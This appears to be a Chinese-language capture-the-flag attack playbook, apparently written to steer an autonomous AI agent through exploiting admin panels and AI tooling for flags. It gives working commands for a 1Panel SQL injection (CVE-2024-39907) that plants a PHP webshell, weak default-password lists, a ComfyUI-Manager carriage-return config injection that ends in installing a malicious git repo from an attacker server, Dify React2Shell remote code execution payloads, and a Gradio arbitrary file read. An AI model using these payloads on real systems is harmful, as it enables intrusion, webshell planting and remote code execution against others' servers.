## 阶段六：常见管理面板登录流程

**当遇到管理面板时，先查看 cve-cheatsheet.json 中是否有该面板的登录 API 格式。**

### 6.1 1Panel

> ⚠️ 拿到 psession 后，可优先验证 CVE-2024-39907 SQLi 写文件路线；文件操作端点是否可用必须以当前响应确认。
> 不要因为 Observer 或本 playbook 给出示例就跳过验证，也不要在同一失败结构上重复消耗轮次。

```bash
# 登录 API（密码需 base64 编码）
curl -si http://TARGET:10086/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"1panel","password":"'$(echo -n '1panel_password' | base64)'","authMethod":"session","language":"zh"}'

# 如果有入口码（EntranceCode），加 header：
# -H 'EntranceCode: BASE64(入口码)'
# 入口码通常在前端 JS bundle 中硬编码，或通过 /api/v1/settings/search 获取

# 登录成功后，获取 cookie 中的 psession/1panel_token，用于后续请求

# CVE-2024-39907 SQLi（登录后）
curl -s http://TARGET:10086/api/v1/hosts/command/search \
  -H 'Content-Type: application/json' \
  -b 'psession=YOUR_SESSION' \
  -d '{"page":1,"pageSize":10,"orderBy":"id;ATTACH DATABASE '\''\'/tmp/shell.php'\''\'' AS t;CREATE TABLE t.e(d text);INSERT INTO t.e VALUES('\''\''<?php system($_GET[c]);?>'\''\'')","order":"ascending","name":"a"}'
# 写入 webshell 后访问：curl http://TARGET/tmp/shell.php?c=cat+/flag*
```

### 6.2 宝塔面板 (BT Panel)
```bash
# 登录 API（密码需 md5 编码）
curl -si http://TARGET:8888/login \
  -d "username=admin&password=$(echo -n 'PASSWORD' | md5sum | cut -d' ' -f1)"
```

### 6.3 phpMyAdmin
```bash
curl -si http://TARGET/phpmyadmin/ \
  -d 'pma_username=root&pma_password=&server=1&token=TOKEN'
```

### 6.4 通用登录策略
1. 先试默认弱口令：admin/admin, admin/123456, admin/password, root/toor
2. 再试题目描述中给定的凭据（注意密码可能需要 base64/md5/URL 编码）
3. 查看前端 JS 源码中的登录逻辑（密码编码方式、额外 header、验证码处理）
4. 如果登录失败 3 次，搜索该面板的未授权访问 CVE（可能不需要登录）

### 6.5 ComfyUI-Manager 配置注入（CR 字节绕过）

> ⚠️ **重启端点是 `/manager/reboot`（无 `/api` 前缀！），`/api/manager/reboot` 会返回 405！**
> 这是最常见的卡点——Agent 改了配置但重启失败，因为用了错误的 URL 路径。

**场景**：ComfyUI-Manager 的 `/api/manager/db_mode` 端点允许修改配置值，但 `write_config` 函数会把值中的 `\n`（换行）转成 tab 续行，导致无法注入独立配置键。

**关键突破**：用 `\r`（CR，回车，`%0d`）代替 `\n`（LF，换行，`%0a`）。Python configparser 在遇到 `\r` 时会把后面的内容当作新行开头，从而实现独立键注入。**`%0d` 和 `%0a` 的结果完全不同！**

**攻击链**：
```bash
TARGET="http://<目标IP>:8188"

# 1. CR 注入降级 security_level 为 weak
curl -s "$TARGET/api/manager/db_mode?value=none%0dsecurity_level%20%3D%20weak"

# 2. 触发重启使配置生效（注意：无 /api 前缀）
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 3. 等待重启后，注入 allow_git_url_install=true
sleep 3
curl -s "$TARGET/api/manager/db_mode?value=none%0dallow_git_url_install%20%3D%20true"

# 4. 再次重启
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 5. 现在可以安装恶意 git 仓库
curl -s -X POST "$TARGET/api/manager/install" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://YOUR_SERVER/evil.git"}'
```

**⚠️ 关键陷阱**：
- **用 `%0d`（CR）不是 `%0a`（LF）！** 这是本题最核心的知识点——`\n` 会被 configparser 转成 tab 续行，`\r` 才能落盘为独立行
- 重启端点是 `/manager/reboot`（无 `/api` 前缀），`/api/manager/reboot` 会返回 405
- 如果 curl 的 `%0d` 被二次编码，改用 Python 原始 socket 发包：
```python
import socket
s = socket.socket()
s.connect(("<目标IP>", 8188))
req = b"GET /api/manager/db_mode?value=none\rsecurity_level%20%3D%20weak HTTP/1.0\r\nHost: <目标IP>:8188\r\n\r\n"
s.send(req)
print(s.recv(4096))
```
- 如果当前响应和版本指纹支持 CVE-2025-67303，先做无害/安全检查，再按响应决定是否进入利用；不要把版本名称本身当作漏洞已证实。

**每步必须校验，不要连续执行到底**：
```bash
# 注入后立即读回配置确认已写入
curl -s "$TARGET/api/manager/db_mode?value=" | grep -oE 'security_level|allow_git_url_install' || true

# 重启后等待服务就绪：最多确认 2 次（同一结构预算仅 3 次），间隔用 sleep 拉长
sleep 3
curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/manager/version" --max-time 5
# 若仍未就绪，再确认最后一次即可，不要循环轮询烧预算
```

**拿 flag 的最终目标**：ComfyUI 题最终都是通过 RCE 读文件拿 flag，而不是无限调试配置：
```bash
# 配置注入成功后，优先直接触发 RCE 读 flag
curl -s "$TARGET/api/manager/install" -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8188/../../../../flag"}'
# 或直接读常见 flag 路径（若 CR 注入已能控制 config 里的路径）
curl -s "$TARGET/file=/flag" ; curl -s "$TARGET/file=/challenge/flag"
```

**⚠️ git install RCE 依赖回连，网络隔离时是死路**：
- `install/git_url` 或 `/customnode/install/git_url` 需要目标主动访问你起的 HTTP 服务器拉取 git 仓库。
- 若多次超时且你这边服务没收到入站请求，说明目标无法回连（网络隔离）——**立即放弃这条路径**，不要反复重试。
- 改为：扫描同主机其他端口（ComfyUI 常和别的服务同机部署），或找不依赖回连的 RCE/文件读取。

**同主机其他端口的 git_url 类接口**：若在别的端口发现 aiohttp 服务，且某接口返回
`ERR TypeError("object of type 'NoneType' has no len()")`，说明该接口**缺少某个参数**（调用
`len()` 前参数是 None）。立即补上常见参数名重试：
```bash
curl -s "http://TARGET:PORT/git_url?url=http://127.0.0.1/"
curl -s "http://TARGET:PORT/git_url?repo=..."
curl -s -X POST "http://TARGET:PORT/git_url" -H 'Content-Type: application/json' -d '{"url":"..."}'
```

### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用

**场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。

**指纹识别**：
```bash
curl -s http://TARGET:3000 | grep -oE 'data-public-api-prefix|SELF_HOSTED|Dify|next'
```

**关键：不要扫同主机其他端口！**
平台对同一请求结构有 3 次硬预算，端口/网段扫描会一次性烧光并封死通道。
只使用题目给的地址与 Memory 里已验证的端口/拓扑线索；确认其他服务用 `challenge_get_state`，不要 `for port in ...` 扫描。

**React2Shell 验证与利用**（当当前指纹支持且同主机没有更合适入口时）：

**⚠️ 无外网环境 scanner.py 下载不了（SSL 失败/超时）**：评测环境通常无外网，
`curl raw.githubusercontent.com` 会失败。改用下面的**手动 payload**（不依赖 scanner.py）。

```bash
# 手动 RSC payload（React2Shell 核心：Next-Action 指定 action + RSC 文本 payload）
# 先探测（safe_check 替代）：发一个最小的 RSC 探针
curl -s -i -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '["$@1"]'
# 观察响应：X-Action-Redirect / 307 / 500 代表 server action 被触发

# RCE payload 结构（利用 RSC 的 thenable/函数引用注入）：
# 核心是构造一个 RSC 行，引用某个可执行 Server Action 并传恶意参数。
# 不同 Dify 版本 action id 不同——但**不要轮流试**（每个变体计一次预算，3 次即封）。
# 先用下面这一条探测请求确定响应特征，再据下表选唯一 action id：
curl -s -i -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '["$@1"]' \
  -w '\nHTTP:%{http_code}\n'
# 观察响应特征（307/303/500/X-Action-Redirect），对照“版本差异”表选唯一 id，一次命中。
```

```bash
# 1. 下载官方 scanner（仅有外网时）
cd /tmp && mkdir -p c03 && cd c03
curl -sL -o scanner.py "https://raw.githubusercontent.com/assetnote/react2shell-scanner/master/scanner.py"

# 2. 先用 safe_check 探测漏洞是否存在
python3 -c "
import scanner
result = scanner.check_vulnerability('http://TARGET:3000', safe_check=True, timeout=15)
print('vulnerable:', result.get('vulnerable'))
print('status:', result.get('status'))
"

# 3. 如果 safe_check 返回 vulnerable=True，执行 RCE
python3 -c "
import scanner
body, ct = scanner.build_rce_payload()
import requests
# 发 payload 并跟踪重定向
s = requests.Session()
resp = s.post('http://TARGET:3000/', data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
print('1st:', resp.status_code, 'Location:', resp.headers.get('Location',''))
# 跟踪 307/303 到 /apps
if resp.status_code in (307, 303):
    loc = resp.headers.get('Location','')
    resp2 = s.post(f'http://TARGET:3000{loc}' if loc.startswith('/') else loc, data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
    print('2nd:', resp2.status_code)
    print('X-Action-Redirect:', resp2.headers.get('X-Action-Redirect','')[:500])
"
```

**版本差异与 fallback**：

| 响应特征 | 可能版本 | 策略（先指纹，再选唯一 id，不轮流试）|
|----------|----------|------|
| 307→303→X-Action-Redirect 回显 | 可能存在可控动作回显 | 进一步验证命令输出/文件读取，不把回显直接当 flag |
| 307→500 | 新版/Cloud 版 | 按响应头/页面特征选一个 `$ACTION_ID_` 前缀（默认 x），只发一次 |
| 307→200 无回显 | 已修复 | 放弃 React2Shell，改用题目已知地址与已确认拓扑上的其他线索 |

**不同 ACTION_ID 变体**：不要用循环逐个试；先根据上一次响应的 `X-Action-Redirect`/状态码/版本指纹确定唯一 id，再发一次：
```bash
# 例：指纹已确认为默认前缀时，只发这一条
curl -s -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '["$@1"]'
```

**⚠️ 关键陷阱**：
- **不要只看默认端口**——同主机可能运行多个服务。对发现的每个端口独立做协议/产品指纹，再选择与证据匹配的 CVE；端口号本身不是漏洞判据。
- scanner.py 的 `build_rce_payload()` 默认 payload 在新版 Dify 上可能返回 500
- 如果 React2Shell 单次命中失败且已无新证据，按“验证预算纪律”止损：不要扫端口或轮流试 id，改为复用 Memory 里已验证的凭据/路径，或 `challenge_get_state` 确认拓扑。

### 6.7 Gradio 任意文件读取（CVE-2024-1561）

**场景**：Gradio 应用（端口通常 7860），HTML 含 `gr-`/`gradio-container`。

**核心**：`/file=` 参数未做路径限制，可读取服务器任意文件。

```bash
# 先指纹确认（一次）
curl -s http://TARGET:7860/ | grep -oE 'gr-|gradio-container|/queue/'

# 命中指纹后，优先一次直读最高价值路径（本平台 flag 通常在 /flag 或 /challenge/）
curl -s 'http://TARGET:7860/file=/flag'

# 只有 /flag 不存在（非 200）时，才根据响应特征换一个路径重试一次，不要连续枚举。
```

**关键**：`/file=` 本身就是遍历入口，不需要登录；优先一次直读 `/flag`，读不到再据响应特征精确定位，不批量枚举路径。
